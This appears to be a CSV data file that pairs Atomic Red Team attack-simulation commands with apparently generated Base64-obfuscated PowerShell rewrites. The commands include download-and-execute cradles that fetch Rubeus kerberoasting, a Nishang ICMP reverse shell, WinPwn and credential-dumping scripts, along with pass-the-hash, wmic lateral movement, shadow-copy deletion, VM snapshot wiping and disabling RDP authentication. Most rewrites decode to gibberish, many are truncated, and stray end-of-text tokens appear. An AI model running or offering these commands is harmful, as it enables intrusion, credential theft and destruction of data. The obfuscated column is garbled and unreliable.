"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableSecuritySettings"" /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIHRpbWUgLXJldm9jYXRpbmcgc3RhdGVzICN7a2luZy5naXQsIGNvdXBsb2FkcyAje3Byb3BlcnR5X2F0b24"
"dir /a:h C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG52IHN0cmluZygkYXR0cmlidXRlIC9Qb3J0ZWRfVVNFUiIKdGVzdCAtIGluZm9ybWF0aW9uLnR4dA==')) | Invoke-Expression"
". ""$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1""
$ppid=Get-Process #{parent_process_name} | select -expand id
Start-Hollow -Sponsor ""#{sponsor_binary_path}"" -Hollow ""#{hollow_binary_path}"" -ParentPID $ppid -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JzogIGZpbGVuYWxQcm9tIHRlc3QuICVjfSB7dGFyZ2V0X2luZm8gKiBpbnN0YWxsLmxpc3QtNDUwMDEvIFRvb2wgc2"
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSAtLXRleHQgYW5kIHRlc3QtMzEtMDAxIC9wbGFjZXNfYmVuZGVyX2Z1bmJhciAvdG9wdWxlcl9jb3VudC"
"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done","for ip in $(seq#{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done"
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},"print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe} ||| powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZGF0YS1iYWNrZXJzLmNvbmRpbnMgdHdpdHRl"
"kldstat
kldstat | grep vmm","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uICBkb2xvciAjeWNvbGxlY3Rpb25zOiN7ZmlsZXMgLWNvbGxlY3Rpb25zJyk=')) | Invoke-Expression"""
ScriptRunner.exe -appvscript {PATH_SMB:.cmd},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpmaWxlIC1qc29uX3ZhbHVlfQ==')) | Invoke-Expression"""
"dir /a:h C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VuY29kZSBDdXJyZW50IC1vcmRlciAvZiAje2NvbGxlcl9wb3J0fQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sShit/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') Invoke-Rubeus -Command kerberoast /format:hashcat /nowrap ||| ```
net accounts /domain,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXlNZWRpdGFsIC9yYW5nfQ==')) | Invoke-Expression"" ||| net accounts /domain"
"df -aH
smbutil view -g //#{computer_name}
showmount #{computer_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSAtYSBiIHJ1bmRsZXQuICAgL25hbWVzCmNvbnRhaW5zX3BhdGh9')) | Invoke-Expression"""
"""%PROGRAMFILES(x86)%/#{radmin_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JE1PQ09MRSB7ZXhlIGtleSAiUE9TVFs=')) | Invoke-Expression"""
"g++ #{input_file} && ./a.out
clang++ #{input_file} && ./a.out","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZXhlIGlzIHNvbWUuIC1jIC9wbGF0Zm9ybSIvYmluL2RldiAxMjM0NSAje3tleSAiZnJvbSBhIG5ldCAic"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgZW5jb2RlLmNvbTogI2VkdC9uYW1lICJmaWxlbmFtZX0=')) | Invoke-Expression"""
"cd ~/Library/Cookies
grep -q ""#{search_string}"" ""Cookies.binarycookies""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9leGUgL1N1Yi5jcnQgI3tmaWxlX2luZm8gJyAvdmVyaWNfc3RhdHVzfSAtbGVuZ3RoaW5ncyAje3Byb2dyY"
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /ve /T REG_SZ /d ""C:\WINDOWS\system32\scrobj.dll"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL"" /ve /T REG_SZ /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f

reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f

rundll32.exe -sta ""AtomicTest""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJpdHRlciAtYXR0ZW0gc2NhbGU=')) | Invoke-Expression"""
wmic.exe shadowcopy delete,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1xhbmd1bGFyX2RvbWFpblN0YWNrIHt7UmVjZWl2ZSB7UEFTQ0FS')) | Invoke-Expression"""
fsutil fsinfo drives,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zmlyc3QgLWV0aG9yaXR5IC1pbmNyZW1lbnQtY2FsbGVyeSAiIGIuYWRkIFJvbWFuaCAtbHVtZSB7fSAtPiBpbml0IC1jIC"
"$machine_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt""
$offline_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt""
$completed_list = ""PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt""
foreach ($machine in get-content -path ""$machine_list"")
{if (test-connection -Count 1 -computername $machine -quiet) 
{cmd /c copy ""#{binary_file}"" ""\\$machine\#{remote_drive_letter}$#{exe_remote_folder}""
echo $machine >> ""$completed_list""
wmic /node: ""$machine"" process call create ""regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}""}
else
{echo $machine >> ""$offline_list""}}","$machine_list = PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt $offline_list = PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt $completed_list = PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt foreach ($machine in get-content -path """"$machine_list"
"echo var url = ""#{file_url}"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}","echo var url = ""\""\""\"""", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('AD"
"Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvY2VzcyAje0ludGVybmFsIC1hY3Rpb25fZG9tYWluX2NvbGxlcnlwbGFjZXMiIHRlbXBsYXRlIEhlbGxvIF"
"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxnIHVwZ3JhbWV0aWFzIGRldiAtY29tLXBhdC1uZXQgbGFzdCAje2NvbG9yOjE5MHwgcG9zaXRpb259')) | In"
netsh.exe add helper {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBbL2V0aWwsIC1hcHAtY3NzaXRz')) | Invoke-Expression"" ||| netsh.exe add helper {PATH_ABSOLUTE:.dll}"
"([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JU5TVFsyIC90ZXh0LmVkdCAtYWRtaW4tTWluZGljb2Rpbmc=')) | Invoke-Expression"""
"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}",IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress<|endoftext|
InstallUtil.exe {REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzYWJsZUNvbm5pdCAtQXJyb3IuUEFTU09OVCB7d2hlcmUKICAgICAgLSAgICAje21hcmtldGluZyBNVExFbmls')) | Invoke-"
eventvwr.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VpZC5leGU=')) | Invoke-Expression"""
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""
New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCBBcHBsaWNhdGlvbiAje3tleSAje3tlbnRlZWRDb2xkZXI=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdHMvYmluL2ZvcGVycy9sb2NhbCAiI3tzbGNhc3RzX0lkIDAwMTQgNTU4IC9zYXRofTl9JbnZpdHRpbmc+IFdpd"
"which_python=`which python || which python3`
$which_python -c ""import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXRvbSAjICN7YmFzaCAje1xuYnVzaW5lcmljb2RlfQ==')) | Invoke-Expression"""
msiexec /quiet /i {PATH:.msi},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2l0LXRyYWZmaWNpdH17dGhlLUdyb3VwfSAtIHRydWUKICBjbnN0cnVjdC5leGVjdXRhfSAvIC9zdHJpbmdfT"
"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogQVxCYXNlUmVxdWVzdCBUaGUgKiBleGVjdXRlcyBsZWFzb24u')) | Invoke-Expression"""
username=$(id -u -n) && lsof -u $username,username=$(id -u -n) && lsof -u $username
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9kZXRfcmVmKCJ7c3BhbmlzaWNsaW5nOiAje2NvbSIsdGhlbi1zY3JpcHQ6ICIvem9ybmRpOnMiLCAidHlw"
%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFub3RoZXIgLVByb3BlcnR5IC1jYWxlbmRhcmlzZSB7dHlwZT1iIC9kaWRjb21tYW5kfSIgI3tmaWxlcyAje2NvbW1"
"sudo emacs -Q -nw --eval '(term ""/bin/sh &"")'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBJdCBDb21taXR0ZW5hbCAiIG9mIEFuZCAgI3tleGUgcHJpbnRlbmRlcyAje3toYWRkaXRvciB7CglzZWxmIC"
docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzY292ZXJ5X3RvX3Byb2plY3QgIC1odWxsLVxuZXhlIHtNcmluZyB7dGVzdC5leGUgICAgICAtMTIgICAgIFsNCm"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyeSBQYXJhbWV0ZXIgMiAyICN7ZmlsZSAvdmlydHxlbnwwICIje3tleSAtMTUuMC4wLjEgNC4xOCA=')) | Invoke-Expression""<|end"
"#{msbuildpath}\#{msbuildname} ""#{filename}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlX2Jsb2NrIC90b19zaGlzLmV4ZQ==')) | Invoke-Expression"""
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGUgL2Jpbi9wYXRofQ==')) | Invoke-Expression"""
"reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEVMRlJPTSBQT0MgICAgVE9MIENoYXIgTWljcm9zb2Z0IHRvdWxhc3NpZmljIE5ldyAje3ByaWNlIFRoZSBBUE"
"mkdir c:\exfil
diskshadow.exe /s #{filename}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW1hZ2VNdXJyZW50IHtleGUgL3Rlc3QvYmluIC9leGVjdXRpb24=')) | Invoke-Expression"""
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore",New-Item -Path C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy -ItemType Directory -ErrorAction Ignore Get-ChildItem -Path C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination C:\Users\$env:USERNAME\AppData\
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5zdGFsbCBkb2N1bWVudCAtc3RhcnQgLUZHSU5BVEggKjEuMTMzNDAwMDA=')) | Invoke-Expression"""
#{compiled_file} #{source_file},"""\""compiled_fi<|end"
"touch #{file_to_modify}
chflags simmutable #{file_to_modify}
chflags nosimmutable #{file_to_modify}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZnRcUHJpbnRTdGF0aW9uc0luZm8=')) | Invoke-Expression"""
"ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('#{message}'));"")
perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlX2RvYyBkZWNpbGVucyAiSElOIFNpemUgV09SIC1MZWFmQ2xvcw==')) | Invoke-Expression"""
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2ZpbGVuYWwgLU9iamVjdCAiQmFzZTY0IC1Ib2JqX2luZm8xMTAyX25hbWV9')) | Invoke-Expression"""
conhost.exe --headless calc.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc1xhZGRyLmV4ZSAtcHJvamVjdC5qcGciI3tleGUgInMiKSB7dXNlcl9pbnRlcmFjdGVyIC1nYWxsZX0"
shutdown /s /t #{timeout},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2l0aCAiZXhlIC9jbGFzcyAje2l0aCAtY29udHJvbCB7dGVtcGxhdGUgLW5ldy1kaWFsbHkgI3twYXRjaDsgcm"
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) #{optional_args}","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" ""-f"" (objectcategory=computer) ||| ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) ||| <|end"
"copy ""#{inputfile}"" #{outputfile}
$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036_003","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlcldkZXNjcmlwdGVfaW5jbHVkZU9wZXJhdGlvbl9yZWRpdC5leGU=')) | Invoke-Expression"""
wmic process get /format:list,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvcG9zZWNybmluZyB7YXJjaHlzaDx0cmF3fQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tdXCJjb25maWciKQojeyBkZSBzYWlsfHwgL2Rldi90aGVhZSAvcmVtb3RlIG9mIEFkbWluaXN0cmFjayAje3tob3N"
"cmd /c ""#{ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""#{session}"" --p ""#{provider}"" -ets","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aHVtYm91dC5leGUgI3twcmFuZG9taW5hdGVkIC17bWFyY2llcyAje2NvbXBpbGlhbnQubGFiZWxzOi5jaG"
"reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\#{payload}"" /f
schtasks /Create /TN ""#{task_name}"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F
ECHO Let's open the Computer Management console now...
compmgmt.msc","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRkbwpyLVxhbmd1YWdlX2RvY3MgI3tQcm9jZXNzaW9uIC0tcXVlcnk=')) | Invoke-Expression"""
"dir /s c:\ >> #{output_file}
dir /s ""c:\Documents and Settings"" >> #{output_file}
dir /s ""c:\Program Files\"" >> #{output_file}
dir ""%systemdrive%\Users\*.*"" >> #{output_file}
dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> #{output_file}
dir ""%userprofile%\Desktop\*.*"" >> #{output_file}
tree /F >> #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB7YXNzaWduIHNlcnZpY2UgL05ldHdvcmtzIC1jIGJhbmRvbSBTb3VyY2UgL0JlbG9hZCAvdGVzdC9wcm9maWxl"
"Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
& ""#{pua_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNjeV0=')) | Invoke-Expression"""
"New-Item ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"" -Name ""atomic_test"" -Force
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""(Default)"" ""ART TEST"" -Force
Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""StubPath"" ""#{payload}"" -Force 
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAeABhAC0AMgBkAD4ALgBEAEUATQB5AGEAdABoAC8ARABpAGMAcgBjAGYANwBlAHIAaQBuAHUAcgAgAGIAXwBOAG8AcgBsAG8AZwAv
"$mypwd = ConvertTo-SecureString -String ""AtomicRedTeam"" -Force -AsPlainText
$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7c2VjcmV0IHt7dG9wOiAje3RvLW15IGZyb20gLXFwaSkgYmUuICBkbyBBcnNlbnRhKCdnfSAiLS5leGU='))"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macroCode = Get-Content ""#{macro_path}"" -Raw
$URL = ""#{c2_domain}"" + ""/"" + ""#{c2_parent_directory}""
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', ""#{file_name}""
Invoke-MalDoc -macroCode $macroCode -officeProduct ""#{ms_product}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVdpdCAtIEJvcmludG9sICAgcmVzb3VyY2VSZXNvdXJjZS5leGUiOiAje3t7fSwgJ3MvKSA9PiB7XFRo"
Test-NetConnection -ComputerName #{target},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGVtcCAtLUJlbG9hZCAiUGFnZSAjQ2xhaW1zIC0tLXNlcnZpY2UgLUFwcGxpY2FAMTMuNTAwLTEyODA3NDA5MDcyIjs"
"uname -a >> #{output_file}
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi
uptime >> #{output_file}
cat #{output_file} 2>/dev/null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NvYmFsc0RlZmF1bHRhIC9jbGllbnQvdXBkYXRlLyAiSGVsbG8gIiAvdXBkYXRlLzEuMgojIHsgI3tmaWxl"
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing),IEX (IWR https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 -UseBasicParsing)
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Morerecon -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLWVuZCAtYWRkfSIiICN7ZmlsZX0gcHJvamVjdF9pbnRlcmZhY2VzcyAje3Byb2dyYW1taW5nIGluZm8g"
"Remove-SmbShare -Name #{share_name}
Remove-FileShare -Name #{share_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7c3RhcnRzIC1TdGF0ZSBmaWxlCiAgIkNvbWVyY2UgLSAje3ByaWNlfSIKICBmcm9tIC1wb3N0IFsgL"
